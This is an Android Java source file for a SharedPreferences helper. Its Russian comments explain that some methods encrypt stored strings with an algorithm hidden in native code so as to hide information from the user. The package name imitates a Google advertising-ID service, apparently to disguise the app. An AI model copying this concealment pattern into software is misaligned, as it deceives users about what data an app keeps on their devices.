package com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.Signature;

import com.advertising_id_service.appclick.googleadvertisingidservice.CryptoProvider.CryptoProviderServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.CryptoProvider.SimpleBLOWFISHCryptoProvider;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;

//Класс отвечающий за работу с SharedPreferences.
//Имеет методы "обертки" которые сохраняют/читают из SharedPreferences
//getSimplePreferences и setSimplePreferences записывают/считывают без кодирования
//getPreferences и setPreferences при записи/считывании кодируют/раскодируют строку спомощью алгоритма из скрытого в ndk.
//Если мы хотим скрыть информацию от пользователя то используем методы с кодированием.
public class SharedPreferencesServicer {

    //Метод сохранения в SharedPreferences с кодированием строки
    public static void setPreferences(Context cnt, String session, String key, String value)
    {
//        SimpleBLOWFISHCryptoProvider cryptoProvider = new SimpleBLOWFISHCryptoProvider();
//        try {
//            Signature[] sigs = cnt.getPackageManager().getPackageInfo(cnt.getPackageName(), PackageManager.GET_SIGNATURES).signatures;
//            if ((sigs.length > 0) && (sigs != null))
//            {
//                cryptoProvider.setSeed(String.valueOf(sigs[0].hashCode()));
//            }
//        } catch (PackageManager.NameNotFoundException e) {
//            Logger.log("" + e.getMessage());
//        }
//
//        String codeText = cryptoProvider.cript(value);
        if (value == null){return;}
        String codeText = CryptoProviderServicer.cript(value);
        cnt.getSharedPreferences(session, Context.MODE_PRIVATE).edit().putString(key, codeText).apply();
    }

    //Метод чтения из SharedPreferences с раскодированием строки
    public static String getPreferences(Context cnt, String session, String key, String default_res)
    {
        String res = cnt.getSharedPreferences(session, Context.MODE_PRIVATE).getString(key, default_res);
        if (res == null){return null;}
//        String decodeText = null;
//        SimpleBLOWFISHCryptoProvider cryptoProvider = new SimpleBLOWFISHCryptoProvider();
//        try {
//            Signature[] sigs = cnt.getPackageManager().getPackageInfo(cnt.getPackageName(), PackageManager.GET_SIGNATURES).signatures;
//            if ((sigs.length > 0) && (sigs != null))
//            {
//                cryptoProvider.setSeed(String.valueOf(sigs[0].hashCode()));
//            }
//        } catch (PackageManager.NameNotFoundException e) {
//            Logger.log("" + e.getMessage());
//        }
//        decodeText = cryptoProvider.deCript(res);
        String decodeText = CryptoProviderServicer.deCript(res);
        return decodeText;
    }

    //Метод сохранения в SharedPreferences без кодированием строки
    public static void setSimplePreferences(Context cnt, String session, String key, String value)
    {
        if (value == null){return;}
        cnt.getSharedPreferences(session, Context.MODE_PRIVATE).edit().putString(key, value).apply();
    }

    //Метод чтения из SharedPreferences без раскодированием строки
    public static String getSimplePreferences(Context cnt, String session, String key, String default_res)
    {
        String res = cnt.getSharedPreferences(session, Context.MODE_PRIVATE).getString(key, default_res);
        if (res == null){return null;}
        return res;
    }
}
